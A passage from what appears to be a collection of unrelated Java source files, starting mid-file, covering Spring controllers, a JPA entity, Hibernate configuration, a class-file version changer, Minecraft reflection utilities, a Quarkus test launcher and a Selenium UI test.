POSSIBILITY OF SUCH DAMAGE.\n *\n * Copyright (C) Marcus Hirt, 2024\n */\npackage se.hirt.recgen;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.time.Instant;\n\nimport org.openjdk.jmc.flightrecorder.writer.TypesImpl;\nimport org.openjdk.jmc.flightrecorder.writer.api.Recording;\nimport org.openjdk.jmc.flightrecorder.writer.api.Recordings;\nimport org.openjdk.jmc.flightrecorder.writer.api.Type;\n\n/**\n * Utilities for creating recordings.\n */\npublic class Utils {\n\t/**\n\t * Creates a {@link Recording} pre-populated with common example data.\n\t * \n\t * @param dir\n\t *            the target directory of the recording.\n\t * @param name\n\t *            the file name of the recording.\n\t * @param pid\n\t *            the pid of the process creating the recording. Not used yet.\n\t * @return a {@link Recording}.\n\t * @throws IOException\n\t *             if something failed.\n\t */\n\tpublic static Recording createDefaultRecording(File dir, String name, long pid) throws IOException {\n\t\tFile location = new File(dir, name);\n\t\treturn createDefaultRecording(location, pid);\n\t}\n\n\t/**\n\t * Creates a {@link Recording} pre-populated with common example data.\n\t * \n\t * @param location\n\t *            the destination location for the recording (full file path, including file name).\n\t * @param pid\n\t *            the pid of the process creating the recording. Not used yet.\n\t * @return a {@link Recording}.\n\t * @throws IOException\n\t *             if something failed.\n\t */\n\tpublic static Recording createDefaultRecording(File location, long pid) throws IOException {\n\t\tInstant now = Instant.now();\n\n\t\tRecording newRecording = Recordings.newRecording(location);\n\t\tType type = registerJVMInformation(newRecording);\n\t\twriteJVMInformationEvent(newRecording, type, pid, now);\n\t\ttype = registerSystemProcess(newRecording);\n\t\twriteSystemProcessEvent(newRecording, type, \"My System Process\", now.minusSeconds(34).toEpochMilli(),\n\t\t\t\tString.valueOf(4711L));\n\t\treturn newRecording;\n\t}\n\n\t/**\n\t * We're simply going to simulate a JMC running. ;)\n\t * \n\t * @param newRecording\n\t *            the {@link Recording} to write the event to.\n\t * @param type\n\t *            the type for jdk.JVMInformation\n\t * @param pid\n\t *            the pid to use for the recorded process. Yup, it's a long for the JVMInformation\n\t *            event, but a string for the SystemProcess events. :'(\n\t * @param now\n\t */\n\tprivate static void writeJVMInformationEvent(Recording newRecording, Type type, long pid, Instant now) {\n\t\tnewRecording.writeEvent(type.asValue(b -> {\n\t\t\tb.putField(\"startTime\", now.toEpochMilli()).putField(\"pid\", pid)\n\t\t\t.putField(\"jvmName\", \"Java HotSpot(TM) 64-Bit Server VM\")\n\t\t\t.putField(\"jvmVersion\", \"Java HotSpot(TM) 64-Bit Server VM (17.0.9+11-LTS-201) for windows-amd64 JRE (17.0.9+11-LTS-201), built on Oct 10 2023 23:16:06 by \\\"mach5one\\\" with MS VC++ 17.1 (VS2022)\")\n\t\t\t.putField(\"jvmArguments\", \"-XX:+UseG1GC -XX:+FlightRecorder -XX:StartFlightRecording=name=JMC_Default,maxsize=100m -Djava.net.preferIPv4Stack=true -Djdk.attach.allowAttachSelf=true --add-exports=java.xml/com.sun.org.apache.xerces.internal.parsers=ALL-UNNAMED --add-exports=jdk.internal.jvmstat/sun.jvmstat.monitor=ALL-UNNAMED --add-exports=java.management/sun.management=ALL-UNNAMED --add-exports=jdk.management.agent/jdk.internal.agent=ALL-UNNAMED --add-exports=jdk.attach/sun.tools.attach=ALL-UNNAMED --add-exports=java.desktop/sun.awt.windows=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED -Dorg.eclipse.swt.internal.carbon.smallFonts -Declipse.pde.launch=",
    "package com.work.controller;\n\nimport java.util.List;\n\nimport javax.servlet.http.HttpServletResponse;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.servlet.ModelAndView;\nimport com.work.common.utils.BaseUtil;\nimport com.work.common.utils.JsonUtil;\nimport com.work.pojo.ForumReply;\nimport com.work.service.ForumReplyService;\n\n@Controller\n@RequestMapping(\"/server/reply\")\npublic class ForumReplyController extends BaseUtil{\n\t\n\t@Autowired\n\tprivate ForumReplyService forumReplyService;\n\t\n\t//\u53bb\u5e16\u5b50\u5217\u8868\n\t@RequestMapping(\"/goForumReplyList\")\n\tpublic ModelAndView goForumReplyList(ModelAndView mv,ForumReply forumReply){\n\t\tmv.setViewName(\"server/forumManage/replyList\");\n\t\tmv.addObject(\"forumReply\", forumReply);\n\t\treturn mv;\n\t}\n\t\n\t//\u83b7\u53d6\u5e16\u5b50\u5217\u8868\n\t@RequestMapping(\"/getForumReplyList\")\n\tpublic void getForumReplyList(HttpServletResponse response,ForumReply forumReply,Integer page,Integer limit){\n\t\tif(page == null){\n\t\t\tpage = 1;\n\t\t}\n\t\tif(limit == null){\n\t\t\tlimit = 10;\n\t\t}\n\t\tint totalCount = forumReplyService.getForumReplyListCount(forumReply);\n\t\tList<ForumReply> list = forumReplyService.getForumReplyList(forumReply,(page-1) * limit, limit);\n\t\toutput(response,JsonUtil.buildJsonByTotalCount(list, totalCount));\n\t}\n\t\n\t//\u53bb\u7f16\u8f91\u8bc4\u8bba\n\t@RequestMapping(\"/goUpdateForumReply\")\n\tpublic ModelAndView goUpdateForumReply(ModelAndView mv,Integer replyId){\n\t\tForumReply forumReply = forumReplyService.getForumReplyById(replyId);\n\t\tmv.addObject(\"forumReply\", forumReply);\n\t\tmv.setViewName(\"server/forumManage/updateReply\");\n\t\treturn mv;\n\t}\n\t\n\t//\u7f16\u8f91\u8bc4\u8bba\n\t@RequestMapping(\"/updateForumReply\")\n\tpublic void updateForumReply(HttpServletResponse response,ForumReply forumReply){\n\t\tforumReplyService.updateForumReply(forumReply);\n\t\toutput(response,JsonUtil.buildFalseJson(0, \"\u7f16\u8f91\u6210\u529f\uff01\"));\n\t}\n\n\t//\u5220\u9664\u8bc4\u8bba\n\t@RequestMapping(\"/deleteForumReply\")\n\tpublic void deleteForumReply(HttpServletResponse response,ForumReply forumReply){\n\t\tforumReplyService.deleteForumReply(forumReply.getReplyId()); \n\t\toutput(response,JsonUtil.buildFalseJson(0, \"\u5220\u9664\u6210\u529f\uff01\"));\n\t}\n\t\n\t\n\n}\n",
    "package shop.mtcoding.projectjobplan.rating;\n\nimport jakarta.servlet.http.HttpSession;\nimport jakarta.validation.Valid;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.validation.Errors;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RestController;\nimport shop.mtcoding.projectjobplan._core.utils.ApiUtil;\nimport shop.mtcoding.projectjobplan.user.SessionUser;\n\n@RequiredArgsConstructor\n@RestController\npublic class RatingController {\n    private final HttpSession session;\n    private final RatingService ratingService;\n\n    @PostMapping(\"/api/boards/{boardId}/rating\") // \uacf5\uace0 \uc8fc\uc778 \ud3c9\uac00\n    public ResponseEntity<?> rateBoard(@PathVariable int boardId, @Valid @RequestBody RatingRequest.RateBoardUser requestDTO, Errors errors) {\n        SessionUser sessionUser = (SessionUser) session.getAttribute(\"sessionUser\");\n        RatingResponse.DTO responseDTO = ratingService.createRating(sessionUser, requestDTO);\n\n        return ResponseEntity.ok(new ApiUtil(responseDTO));\n    }\n\n    @PostMapping(\"/api/resumes/{resumeId}/rating\") // \uc774\ub825\uc11c \uc8fc\uc778 \ud3c9\uac00\n    public ResponseEntity<?> rateResume(@PathVariable int resumeId, @RequestBody RatingRequest.RateResumeUser requestDTO, Errors errors) {\n        SessionUser sessionUser = (SessionUser) session.getAttribute(\"sessionUser\");\n        RatingResponse.DTO responseDTO = ratingService.createRating(sessionUser, requestDTO);\n\n        return ResponseEntity.ok(new ApiUtil(responseDTO));\n    }\n}\n",
    "package dev.xdark.versionchanger;\r\n\r\nimport java.io.DataInputStream;\r\nimport java.io.IOException;\r\nimport java.io.InputStream;\r\nimport java.io.PushbackInputStream;\r\nimport java.lang.invoke.MethodHandles;\r\nimport java.lang.invoke.VarHandle;\r\nimport java.nio.ByteOrder;\r\n\r\npublic abstract class VersionChanger {\r\n\tprivate static final VarHandle VH_INT = MethodHandles.byteArrayViewVarHandle(int[].class, ByteOrder.BIG_ENDIAN);\r\n\tprivate static final VarHandle VH_SHORT = MethodHandles.byteArrayViewVarHandle(short[].class, ByteOrder.BIG_ENDIAN);\r\n\tstatic final int HEADER = 0xcafebabe;\r\n\r\n\tpublic InputStream change(InputStream in) throws IOException {\r\n\t\tDataInputStream dis = new DataInputStream(in);\r\n\t\tif (HEADER != dis.readInt()) {\r\n\t\t\tthrow new IOException(\"Stream does not start with %s\".formatted(Integer.toHexString(HEADER)));\r\n\t\t}\r\n\t\tint minorVersion = dis.readUnsignedShort();\r\n\t\tint majorVersion = dis.readUnsignedShort();\r\n\t\tVersionChange versionChange = changeVersion(majorVersion, minorVersion);\r\n\t\tPushback pushback = new Pushback(in);\r\n\t\tbyte[] buf = new byte[4 + 2 + 2];\r\n\t\tVH_INT.set(buf, 0, HEADER);\r\n\t\tVH_SHORT.set(buf, 4, (short) versionChange.minorVersion());\r\n\t\tVH_SHORT.set(buf, 6, (short) versionChange.majorVersion());\r\n\t\tpushback.set(buf);\r\n\t\treturn pushback;\r\n\t}\r\n\r\n\tprotected abstract VersionChange changeVersion(int majorVersion, int minorVersion);\r\n\r\n\tprivate static final class Pushback extends PushbackInputStream {\r\n\r\n\t\tpublic Pushback(InputStream in) {\r\n\t\t\tsuper(in, 1);\r\n\t\t}\r\n\r\n\t\tvoid set(byte[] buf) {\r\n\t\t\tthis.buf = buf;\r\n\t\t\tpos = 0;\r\n\t\t}\r\n\t}\r\n}\r\n",
    "package com.jujeob.entity;\n\nimport jakarta.persistence.*;\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport lombok.NonNull;\nimport org.springframework.data.annotation.CreatedDate;\nimport org.springframework.data.annotation.LastModifiedDate;\nimport org.springframework.data.jpa.domain.support.AuditingEntityListener;\n\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\n\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\n@Entity\n@EntityListeners(AuditingEntityListener.class)\npublic class Member {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long memNo;\n\n    @NonNull\n    private String memId;\n\n    @NonNull\n    private String memPw;\n\n    @NonNull\n    private String memNickname;\n\n    @NonNull\n    private String memName;\n\n    @NonNull\n    private String memEmail;\n\n    @NonNull\n    private String memPhone;\n\n    private String memAddr;\n\n\n    @NonNull\n    @CreatedDate // \uc0dd\uc131\ub418\ub294 \uc2dc\uac04\uc744 \uc790\ub3d9\uc73c\ub85c \ub123\uc5b4\uc90c\n    private LocalDateTime createDate;\n\n    @LastModifiedDate // \uc5d4\ud2f0\ud2f0\uac00 \uc218\uc815\ub420 \ub54c \uc218\uc815\uc2dc\uac04\uc744 \ub123\uc5b4\uc90c\n    private LocalDateTime updateDate;\n\n    @NonNull\n    private String memDeleted;\n\n    private LocalDateTime deleteDate;\n\n    private String memImage;\n\n    @NonNull\n    private String memRole;\n}\n",
    "package com.example.customer.controller;\n\nimport com.example.customer.ddd.model.redis.User;\nimport com.example.customer.ddd.service.RedisService;\nimport com.example.customer.utility.MakeContent;\nimport org.springframework.http.MediaType;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.server.ServerWebExchange;\nimport reactor.core.publisher.Flux;\nimport reactor.core.publisher.Mono;\n\n@Controller\npublic class RedisController {\n\n\n    final RedisService redisService;\n\n    public RedisController(RedisService redisService) {\n        this.redisService = redisService;\n    }\n\n\n    @ResponseBody\n    @RequestMapping(\n            method = RequestMethod.PATCH,\n            consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE,\n            produces = MediaType.APPLICATION_JSON_VALUE,\n            value = \"/add/websocket/session\"\n    )\n    public Mono<User> addWebSocketSession(\n            @RequestPart(value = \"username\", required = false) String username,\n            @RequestPart(value = \"host\", required = false) String host,\n            @RequestPart(value = \"port\", required = false) String port,\n            @RequestPart(value = \"wsSessionId\", required = false) String wsSessionId,\n            ServerWebExchange exchange\n    ) {\n        return exchange.getFormData()\n                .flatMap(form -> {\n                    String username1 = form.get(\"username\").get(0);\n                    String host1 = form.get(\"host\").get(0);\n                    int port1 = Integer.valueOf(form.get(\"port\").get(0));\n                    String wsSessionId1 = form.get(\"wsSessionId\").get(0);\n                    return redisService.addWebSocket(username1, host1, port1, wsSessionId1);\n                });\n    }\n\n    @ResponseBody\n    @RequestMapping(\n            method = RequestMethod.DELETE,\n            consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE,\n            produces = MediaType.APPLICATION_JSON_VALUE,\n            value = \"/remove/websocket/session\"\n    )\n    public Mono<User> removeWebSocketSession(\n            @RequestPart(value = \"username\", required = false) String username,\n            @RequestPart(value = \"host\", required = false) String host,\n            @RequestPart(value = \"port\", required = false) String port,\n            @RequestPart(value = \"wsSessionId\", required = false) String wsSessionId,\n            ServerWebExchange exchange\n    ) {\n        return exchange.getFormData()\n                .flatMap(form -> {\n                    String username1 = form.get(\"username\").get(0);\n                    String host1 = form.get(\"host\").get(0);\n                    int port1 = Integer.valueOf(form.get(\"port\").get(0));\n                    String wsSessionId1 = form.get(\"wsSessionId\").get(0);\n                    return redisService.removeWebSocket(username1, host1, port1, wsSessionId1);\n                });\n    }\n\n    @ResponseBody\n    @RequestMapping(\n            method = RequestMethod.GET,\n            produces = MediaType.APPLICATION_JSON_VALUE,\n            value = \"/find/all/keys\"\n    )\n    public Flux<User> findAllKeys() {\n        return redisService.findAllUsers();\n    }\n\n    @ResponseBody\n    @RequestMapping(\n            method = RequestMethod.GET,\n            produces = MediaType.TEXT_HTML_VALUE,\n            value = \"/find/all/hashkeys\"\n    )\n    public Flux<String> findAllHashKeys() {\n        return redisService.getAllHashKeys()\n                .map(string -> {\n                    return string + \"\\n\";\n                });\n    }\n\n    @ResponseBody\n    @RequestMapping(\n            method = RequestMethod.GET,\n            produces = MediaType.APPLICATION_JSON_VALUE,\n            value = \"/find/ids/{keys}\"\n    )\n    public Flux<User> findAllById(@RequestParam(name = \"keys\") String[] keys) {\n        return redisService.findAllUsersByKeys(keys);\n    }\n\n    @ResponseBody\n    @RequestMapping(\n            method = RequestMethod.POST,\n            consumes = MediaType.APPLICATION_JSON_VALUE,\n            produces = MediaType.TEXT_HTML_VALUE,\n            value = \"/publish\"\n    )\n    public Mono<String> publish(\n            @RequestBody MakeContent<User> content,\n            @RequestHeader(\"topic-name\") String topicName\n    ) {\n        return redisService.convertAndSend(topicName, content)\n                .flatMap(aLong -> {\n                    return Mono.just(aLong + \"\");\n                });\n    }\n\n\n}\n",
    "package groupone.config;\n\nimport groupone.model.*;\nimport jakarta.persistence.EntityManagerFactory;\nimport lombok.NoArgsConstructor;\nimport org.hibernate.SessionFactory;\nimport org.hibernate.boot.registry.StandardServiceRegistryBuilder;\nimport org.hibernate.cfg.Configuration;\nimport org.hibernate.service.ServiceRegistry;\n\nimport java.util.Properties;\n\n@NoArgsConstructor(access = lombok.AccessLevel.PRIVATE)\npublic class HibernateConfig {\n\n    private static EntityManagerFactory entityManagerFactory;\n\n    private static EntityManagerFactory buildEntityFactoryConfig() {\n        try {\n            Configuration configuration = new Configuration();\n\n            Properties props = new Properties();\n\n            props.put(\"hibernate.connection.url\", \"jdbc:postgresql://localhost:5432/eventdb?currentSchema=public\");\n            props.put(\"hibernate.connection.username\", \"postgres\");\n            props.put(\"hibernate.connection.password\", \"postgres\");\n            props.put(\"hibernate.show_sql\", \"true\"); // show sql in console\n            props.put(\"hibernate.format_sql\", \"true\"); // format sql in console\n            props.put(\"hibernate.use_sql_comments\", \"true\"); // show sql comments in console\n\n            props.put(\"hibernate.dialect\", \"org.hibernate.dialect.PostgreSQLDialect\"); // dialect for postgresql\n            props.put(\"hibernate.connection.driver_class\", \"org.postgresql.Driver\"); // driver class for postgresql\n            props.put(\"hibernate.archive.autodetection\", \"class\"); // hibernate scans for annotated classes\n            props.put(\"hibernate.current_session_context_class\", \"thread\"); // hibernate current session context\n            props.put(\"hibernate.hbm2ddl.auto\", \"update\"); // hibernate creates tables based on entities\n\n\n            return getEntityManagerFactory(configuration, props);\n        } catch (Throwable ex) {\n            System.err.println(\"Initial SessionFactory creation failed.\" + ex);\n            throw new ExceptionInInitializerError(ex);\n        }\n    }\n\n    private static EntityManagerFactory getEntityManagerFactory(Configuration configuration, Properties props) {\n        configuration.setProperties(props);\n\n        getAnnotationConfiguration(configuration);\n\n        ServiceRegistry serviceRegistry = new StandardServiceRegistryBuilder().applySettings(configuration.getProperties()).build();\n        System.out.println(\"Hibernate Java Config serviceRegistry created\");\n\n        SessionFactory sf = configuration.buildSessionFactory(serviceRegistry);\n        return sf.unwrap(EntityManagerFactory.class);\n    }\n\n    private static void getAnnotationConfiguration(Configuration configuration) {\n        configuration.addAnnotatedClass(User.class);\n        configuration.addAnnotatedClass(Role.class);\n        configuration.addAnnotatedClass(Event.class);\n        configuration.addAnnotatedClass(Location.class);\n        configuration.addAnnotatedClass(EventSpec.class);\n        configuration.addAnnotatedClass(Zipcode.class);\n        configuration.addAnnotatedClass(ResetRequest.class);\n    }\n\n    public static EntityManagerFactory getEntityManagerFactoryConfig() {\n        if (entityManagerFactory == null) entityManagerFactory = buildEntityFactoryConfig();\n        return entityManagerFactory;\n    }\n\n    public static EntityManagerFactory getEntityManagerFactoryConfigForTesting() {\n        if (entityManagerFactory == null) entityManagerFactory = setupHibernateConfigurationForTesting();\n        return entityManagerFactory;\n\n    }\n    private static EntityManagerFactory setupHibernateConfigurationForTesting() {\n        try {\n            Configuration configuration = new Configuration();\n            Properties props = new Properties();\n            props.put(\"hibernate.dialect\", \"org.hibernate.dialect.PostgreSQLDialect\");\n            props.put(\"hibernate.connection.driver_class\", \"org.testcontainers.jdbc.ContainerDatabaseDriver\");\n            props.put(\"hibernate.connection.url\", \"jdbc:tc:postgresql:15.3-alpine3.18:///test-db\");\n            props.put(\"hibernate.connection.username\", \"postgres\");\n            props.put(\"hibernate.connection.password\", \"postgres\");\n            props.put(\"hibernate.archive.autodetection\", \"class\");\n            props.put(\"hibernate.show_sql\", \"true\");\n            props.put(\"hibernate.hbm2ddl.auto\", \"create-drop\");\n            return getEntityManagerFactory(configuration, props);\n        } catch (Throwable ex) {\n            System.err.println(\"Initial SessionFactory creation failed.\" + ex);\n            throw new ExceptionInInitializerError(ex);\n        }\n    }\n\n    public static EntityManagerFactory getEntityManagerFactory(boolean isTest){\n        if(isTest) return getEntityManagerFactoryConfigForTesting();\n        return getEntityManagerFactoryConfig();\n    }\n\n}\n",
    "package org.ru.itmo.processing.recognition;\n\nimport com.google.gson.JsonObject;\nimport com.google.gson.JsonParser;\nimport org.ru.itmo.processing.recognition.ParserCommand.SimpleParseCommand;\nimport org.ru.itmo.processing.recognition.VoiceRecognitions.OfflineWhisperTranscriber;\nimport org.ru.itmo.processing.recognition.VoiceRecognitions.OpenAITranscriber;\nimport org.ru.itmo.processing.recognition.VoiceRecognitions.Transcriber;\nimport org.ru.itmo.processing.settings.AppSettingsState;\nimport org.ru.itmo.processing.settings.TranscriberType;\n\nimport java.util.concurrent.CompletableFuture;\n\npublic class VoiceMatchToCommand {\n\n    public static String match(String path) {\n        String transcription = loadTranscription(path);\n        return SimpleParseCommand.parse(transcription);\n    }\n\n    private static String loadTranscription(String path) {\n        Transcriber transcriber;\n        AppSettingsState settings = AppSettingsState.getInstance();\n\n        if (settings.transcriberType.equals(TranscriberType.ONLINE)) {\n            transcriber = new OpenAITranscriber();\n        } else {\n            transcriber = new OfflineWhisperTranscriber();\n        }\n\n        CompletableFuture<String> transcriptionFuture = transcriber.transcribeAudio(path);\n        String transcriptionResult = transcriptionFuture.join();\n        return parseTranscriptionText(transcriptionResult);\n    }\n\n    private static String parseTranscriptionText(String transcriptionJson) {\n        try {\n            JsonObject jsonObj = JsonParser.parseString(transcriptionJson).getAsJsonObject();\n            return jsonObj.get(\"text\").getAsString();\n        } catch (Exception e) {\n            System.err.println(\"Error parsing transcription JSON: \" + e.getMessage());\n            return \"\";\n        }\n    }\n}\n",
    "/*\n * This file is part of FastBoard, licensed under the MIT License.\n *\n * Copyright (c) 2019-2023 MrMicky\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\npackage pine.toast.library.utilities.fastboard;\n\nimport org.bukkit.Bukkit;\n\nimport java.lang.invoke.MethodHandle;\nimport java.lang.invoke.MethodHandles;\nimport java.lang.invoke.MethodType;\nimport java.lang.reflect.Field;\nimport java.util.Optional;\nimport java.util.function.Predicate;\n\n/**\n * Small reflection utility class to use CraftBukkit and NMS.\n *\n * @author MrMicky\n */\n@SuppressWarnings(\"unused\")\npublic final class FastReflection {\n\n    private static final String NM_PACKAGE = \"net.minecraft\";\n    public static final String OBC_PACKAGE = \"org.bukkit.craftbukkit\";\n    public static final String NMS_PACKAGE = NM_PACKAGE + \".server\";\n\n    public static final String VERSION = Bukkit.getServer().getClass().getPackage().getName().substring(OBC_PACKAGE.length() + 1);\n\n    private static final MethodType VOID_METHOD_TYPE = MethodType.methodType(void.class);\n    private static final boolean NMS_REPACKAGED = optionalClass(NM_PACKAGE + \".network.protocol.Packet\").isPresent();\n\n    private static volatile Object theUnsafe;\n\n    private FastReflection() {\n        throw new UnsupportedOperationException();\n    }\n\n    public static boolean isRepackaged() {\n        return NMS_REPACKAGED;\n    }\n\n    public static String nmsClassName(String post1_17package, String className) {\n        if (NMS_REPACKAGED) {\n            String classPackage = post1_17package == null ? NM_PACKAGE : NM_PACKAGE + '.' + post1_17package;\n            return classPackage + '.' + className;\n        }\n        return NMS_PACKAGE + '.' + VERSION + '.' + className;\n    }\n\n    public static Class<?> nmsClass(String post1_17package, String className) throws ClassNotFoundException {\n        return Class.forName(nmsClassName(post1_17package, className));\n    }\n\n    public static Optional<Class<?>> nmsOptionalClass(String post1_17package, String className) {\n        return optionalClass(nmsClassName(post1_17package, className));\n    }\n\n    public static String obcClassName(String className) {\n        return OBC_PACKAGE + '.' + VERSION + '.' + className;\n    }\n\n    public static Class<?> obcClass(String className) throws ClassNotFoundException {\n        return Class.forName(obcClassName(className));\n    }\n\n    public static Optional<Class<?>> obcOptionalClass(String className) {\n        return optionalClass(obcClassName(className));\n    }\n\n    public static Optional<Class<?>> optionalClass(String className) {\n        try {\n            return Optional.of(Class.forName(className));\n        } catch (ClassNotFoundException e) {\n            return Optional.empty();\n        }\n    }\n\n    public static Object enumValueOf(Class<?> enumClass, String enumName) {\n        return Enum.valueOf(enumClass.asSubclass(Enum.class), enumName);\n    }\n\n    public static Object enumValueOf(Class<?> enumClass, String enumName, int fallbackOrdinal) {\n        try {\n            return enumValueOf(enumClass, enumName);\n        } catch (IllegalArgumentException e) {\n            Object[] constants = enumClass.getEnumConstants();\n            if (constants.length > fallbackOrdinal) {\n                return constants[fallbackOrdinal];\n            }\n            throw e;\n        }\n    }\n\n    static Class<?> innerClass(Class<?> parentClass, Predicate<Class<?>> classPredicate) throws ClassNotFoundException {\n        for (Class<?> innerClass : parentClass.getDeclaredClasses()) {\n            if (classPredicate.test(innerClass)) {\n                return innerClass;\n            }\n        }\n        throw new ClassNotFoundException(\"No class in \" + parentClass.getCanonicalName() + \" matches the predicate.\");\n    }\n\n    public static PacketConstructor findPacketConstructor(Class<?> packetClass, MethodHandles.Lookup lookup) throws Exception {\n        try {\n            MethodHandle constructor = lookup.findConstructor(packetClass, VOID_ME",
    "package io.quarkiverse.antora.test;\n\nimport java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.List;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.Collectors;\n\npublic class DevModeProcess implements Closeable {\n    //private static final Logger log = Logger.getLogger(DevModeProcess.class);\n    private Process process;\n    private Thread outputSlurper;\n    private volatile boolean stopped = false;\n    private final CountDownLatch startedLatch = new CountDownLatch(1);\n\n    public DevModeProcess(Path baseDir) throws InterruptedException {\n        baseDir = baseDir.toAbsolutePath().normalize();\n        final Path multiModuleProjectDir = multiModuleProjectDir(baseDir);\n\n        final List<String> cmd = cmd(multiModuleProjectDir, baseDir);\n        System.out.println(\"Starting quarkus-cxf-test-ws-rm-server: \" + cmd.stream().collect(Collectors.joining(\" \")));\n        try {\n            process = new ProcessBuilder()\n                    .command(cmd)\n                    .redirectErrorStream(true)\n                    .start();\n\n            /* Unless we slurp the process output, the server app will eventually freeze on Windows */\n            outputSlurper = new Thread(() -> {\n                try (BufferedReader in = new BufferedReader(\n                        new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {\n                    String line;\n                    while (!stopped && (line = in.readLine()) != null) {\n                        System.out.println(\"server: \" + line);\n                        if (line.contains(\"Installed features: [\")) {\n                            startedLatch.countDown();\n                        }\n                    }\n                } catch (IOException e) {\n                    if (!\"Stream closed\".equals(e.getMessage())) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n            outputSlurper.start();\n        } catch (IOException e) {\n            throw new RuntimeException(cmd.stream().collect(Collectors.joining(\" \")), e);\n        }\n\n        startedLatch.await(15, TimeUnit.SECONDS);\n    }\n\n    private Path multiModuleProjectDir(Path baseDir) {\n        Path multiModuleProjectDir = baseDir.toAbsolutePath().normalize();\n        while (!Files.exists(multiModuleProjectDir.resolve(\".mvn\"))) {\n            multiModuleProjectDir = multiModuleProjectDir.getParent();\n            if (multiModuleProjectDir == null) {\n                throw new IllegalStateException(\n                        \"Could not find .mvn repository root for \" + baseDir);\n            }\n        }\n        return multiModuleProjectDir;\n    }\n\n    private List<String> cmd(Path multiModuleProjectDir, Path baseDir) {\n        final Path javaHome = Path.of(System.getProperty(\"java.home\"));\n        final List<String> cmd = List.of(\n                javaHome.resolve(\"bin/java\" + (System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? \".exe\" : \"\"))\n                        .toString(),\n                \"-classpath\", multiModuleProjectDir.resolve(\".mvn/wrapper/maven-wrapper.jar\").toString(),\n                \"-Dmaven.multiModuleProjectDirectory=\" + multiModuleProjectDir.toString(),\n                \"org.apache.maven.wrapper.MavenWrapperMain\",\n                \"quarkus:dev\");\n        return cmd;\n    }\n\n    @Override\n    public void close() {\n        process.destroy();\n        stopped = true;\n        if (outputSlurper != null) {\n            try {\n                outputSlurper.join(5000);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n}\n",
    "package US_506;\n\nimport Utility.BaseDriver;\nimport Utility.Tools;\nimport org.openqa.selenium.support.ui.ExpectedConditions;\nimport org.testng.Assert;\nimport org.testng.annotations.Test;\n\npublic class Gift extends BaseDriver {\n    @Test\n    public void GiftOrderingTest() {\n        GiftOrdering_Elements go = new GiftOrdering_Elements();\n\n        Assert.assertTrue(go.tabMenu.get(0).getText().contains(\"Computers\"), \"Tab menu did not display\");\n        go.giftCards.click();\n        wait.until(ExpectedConditions.visibilityOf(go.randomGift));\n        go.randomGift.click();\n        wait.until(ExpectedConditions.visibilityOf(go.recipentName));\n        String product = go.product1.getText();\n\n        Tools.ActionHover(go.recipentName);\n        go.recipentName.sendKeys(\"demet\");\n        go.recipentEmail.sendKeys(\"ucar@gmail.com\");\n        go.yourName.sendKeys(\"ayse\");\n        go.yourEmail.sendKeys(\"ayse@gmail.com\");\n        go.messageBox.sendKeys(\"Sevgilerle\");\n        Tools.ActionHover(go.addcartButton);\n\n        go.addcartButton.click();\n        wait.until(ExpectedConditions.elementToBeClickable(go.greenShoppingCart));\n        go.greenShoppingCart.click();\n        wait.until(ExpectedConditions.visibilityOf(go.product2));\n        String product3 = go.product2.getText();\n\n        Assert.assertEquals(product3, product, \"products are different\");\n\n\n    }\n}\n",
